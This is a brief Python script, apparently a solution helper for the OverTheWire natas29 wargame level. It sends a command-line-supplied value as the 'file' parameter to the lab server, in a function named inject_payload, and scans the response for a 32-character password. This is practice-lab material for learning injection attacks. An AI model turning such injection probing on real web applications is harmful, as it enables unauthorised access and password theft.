import sys
import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '29'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas29', passw.strip())
    space = " "
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload = {'file':sys.argv[1]}
    r = requests.get('http://natas29.natas.labs.overthewire.org/', auth=auth, params=payload)
    passreg = '[a-zA-Z0-9]{32}'
    #print(re.findall(passreg, r.text)[0])
    #print(r.text[r.text.find('<pre>'):])
    print(r.text)

if __name__ == "__main__":
    inject_payload()
